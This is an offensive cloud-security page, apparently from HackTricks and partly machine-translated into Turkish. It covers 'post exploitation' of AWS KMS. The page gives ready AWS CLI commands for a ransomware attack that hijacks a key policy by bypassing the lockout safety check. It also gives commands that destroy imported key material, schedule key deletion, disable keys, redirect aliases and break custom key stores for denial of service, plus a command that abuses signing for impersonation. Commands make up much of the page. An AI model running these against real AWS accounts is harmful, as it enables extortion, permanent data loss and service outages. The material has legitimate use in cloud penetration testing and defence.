# AWS - KMS Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## KMS

Daha fazla bilgi için bakınız:

{{#ref}}
../aws-services/aws-kms-enum.md
{{#endref}}

### Encrypt/Decrypt information

`fileb://` and `file://` are URI schemes used in AWS CLI commands to specify the path to local files:

- `fileb://:` dosyayı ikili modda okur, genellikle metin olmayan dosyalar için kullanılır.
- `file://:` dosyayı metin modunda okur, tipik olarak düz metin dosyaları, scriptler veya özel kodlama gereksinimi olmayan JSON için kullanılır.

> [!TIP]
> Note that if you want to decrypt some data inside a file, the file must contain the binary data, not base64 encoded data. (fileb://)

- Using a **symmetric** key
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
- Bir **asymmetric** anahtar kullanma:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS Ransomware

KMS üzerinde ayrıcalıklı erişime sahip bir saldırgan, anahtarların KMS politikasını değiştirebilir ve hesabına bu anahtarlara erişim verebilir; meşru hesabın sahip olduğu erişimi kaldırabilir.

Böylece meşru hesap kullanıcıları, bu anahtarlarla şifrelenmiş herhangi bir servisin bilgilerine erişemeyecek ve bu, hesap üzerinde basit ama etkili bir ransomware oluşturacaktır.

> [!WARNING]
> Bu saldırıdan **AWS managed keys etkilenmez**, sadece **Customer managed keys** etkilenir.

> Ayrıca **`--bypass-policy-lockout-safety-check`** parametresinin kullanılması gerektiğini unutmayın (web konsolunda bu seçeneğin olmaması bu saldırıyı yalnızca CLI'dan mümkün kılar).
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
> [!CAUTION]
> Bu politikayı değiştirip erişimi yalnızca bir harici hesaba verirseniz ve ardından bu harici hesaptan orijinal hesaba erişimi geri vermek için yeni bir politika ayarlamaya çalışırsanız, bunu yapamazsınız çünkü Put Polocy action cannot be performed from a cross account.

<figure><img src="../../../images/image (77).png" alt=""><figcaption></figcaption></figure>

### Generic KMS Ransomware

global KMS Ransomware gerçekleştirmek için başka bir yol daha vardır; bu aşağıdaki adımları içerir:

- Saldırgan tarafından içe aktarılan **key with a key material** ile yeni bir key oluşturun
- **Re-encrypt older data** — kurbanın önceki sürümle şifrelenmiş daha eski verilerini yeni sürümle yeniden şifreleyin
- **Delete the KMS key**
- Artık yalnızca orijinal key material'e sahip saldırgan şifrelenmiş veriyi çözebilecektir

### Delete Keys via kms:DeleteImportedKeyMaterial

With the `kms:DeleteImportedKeyMaterial` permission, an actor can delete the imported key material from CMKs with `Origin=EXTERNAL` (CMKs that have imported their key material), making them unable to decrypt data. This action is destructive and irreversible unless compatible material is re-imported, allowing an attacker to effectively cause ransomware-like data loss by rendering encrypted information permanently inaccessible.
```bash
aws kms delete-imported-key-material --key-id <Key_ID>
```
### Anahtarları yok etme

Anahtarları yok ederek DoS gerçekleştirmek mümkündür.
```bash
# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
> [!CAUTION]
> Unutmayın: AWS artık **önceki işlemlerin hesaplar arası olarak gerçekleştirilmesini engelliyor:**

### Alias'i Değiştir veya Sil
Bu saldırı AWS KMS alias'larını siler veya yeniden yönlendirir, anahtar çözümlemesini bozar ve bu alias'lara bağlı olan hizmetlerde anında hatalara yol açarak bir hizmet engelleme (denial-of-service) durumuna neden olur. `kms:DeleteAlias` veya `kms:UpdateAlias` gibi izinlerle bir saldırgan alias'ları kaldırabilir veya yeniden hedefleyebilir ve kriptografik işlemleri (ör. encrypt, describe) kesintiye uğratabilir. Alias yerine key ID'yi referans veren herhangi bir hizmet, alias geri yüklenene veya doğru şekilde yeniden eşlenene kadar başarısız olabilir.
```bash
# Delete Alias
aws kms delete-alias --alias-name alias/<key_alias>

# Update Alias
aws kms update-alias \
--alias-name alias/<key_alias> \
--target-key-id <new_target_key>
```
### Anahtar Silinmesini İptal Etme
`kms:CancelKeyDeletion` ve `kms:EnableKey` gibi izinlerle, bir aktör bir AWS KMS customer master key'in planlanmış silinmesini iptal edebilir ve daha sonra yeniden etkinleştirebilir. Bu işlem anahtarı kurtarır (başlangıçta Disabled durumunda) ve daha önce korunan verileri şifre çözme yeteneğini geri kazandırır; böylece exfiltration mümkün olur.
```bash
# Firts cancel de deletion
aws kms cancel-key-deletion \
--key-id <Key_ID>

## Second enable the key
aws kms enable-key \
--key-id <Key_ID>
```
### Anahtarı Devre Dışı Bırak
`kms:DisableKey` iznine sahip bir aktör, bir AWS KMS customer master key'i devre dışı bırakabilir ve böylece key'in encryption veya decryption için kullanılmasını engeller. Bu, o CMK'ye bağlı hizmetlerin erişimini keser ve anahtar yeniden etkinleştirene kadar anında kesintilere veya bir denial-of-service'e neden olabilir.
```bash
aws kms disable-key \
--key-id <key_id>
```
### Paylaşılan Sır Türetme
`kms:DeriveSharedSecret` izniyle, bir aktör KMS tarafından tutulan bir private key ile kullanıcı tarafından sağlanan bir public key'i kullanarak bir ECDH shared secret hesaplayabilir.
```bash
aws kms derive-shared-secret \
--key-id <key_id> \
--public-key fileb:///<route_to_public_key> \
--key-agreement-algorithm <algorithm>
```
### Impersonation via kms:Sign
`kms:Sign` izniyle, bir aktör KMS'de saklanan bir CMK'yı özel anahtarı ifşa etmeden veriyi kriptografik olarak imzalamak için kullanabilir; bu, impersonation'a olanak tanıyan veya kötü amaçlı işlemleri yetkilendiren geçerli imzalar üretir.
```bash
aws kms sign \
--key-id <key-id> \
--message fileb://<ruta-al-archivo> \
--signing-algorithm <algoritmo> \
--message-type RAW
```
### DoS with Custom Key Stores
`kms:DeleteCustomKeyStore`, `kms:DisconnectCustomKeyStore` veya `kms:UpdateCustomKeyStore` gibi izinlere sahip bir aktör, bir AWS KMS Custom Key Store (CKS)'yi değiştirebilir, bağlantısını kesebilir veya silebilir ve böylece master anahtarlarını çalışmaz hâle getirebilir. Bu, bu anahtarlara bağlı hizmetler için şifreleme, şifre çözme ve imzalama işlemlerini bozarak anında bir denial-of-service'e neden olabilir. Bu nedenle bu izinlerin kısıtlanması ve izlenmesi kritiktir.
```bash
aws kms delete-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms disconnect-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms update-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID> --new-custom-key-store-name <NEW_NAME> --key-store-password <NEW_PASSWORD>
```
<figure><img src="../../../images/image (76).png" alt=""><figcaption></figcaption></figure>

{{#include ../../../banners/hacktricks-training.md}}
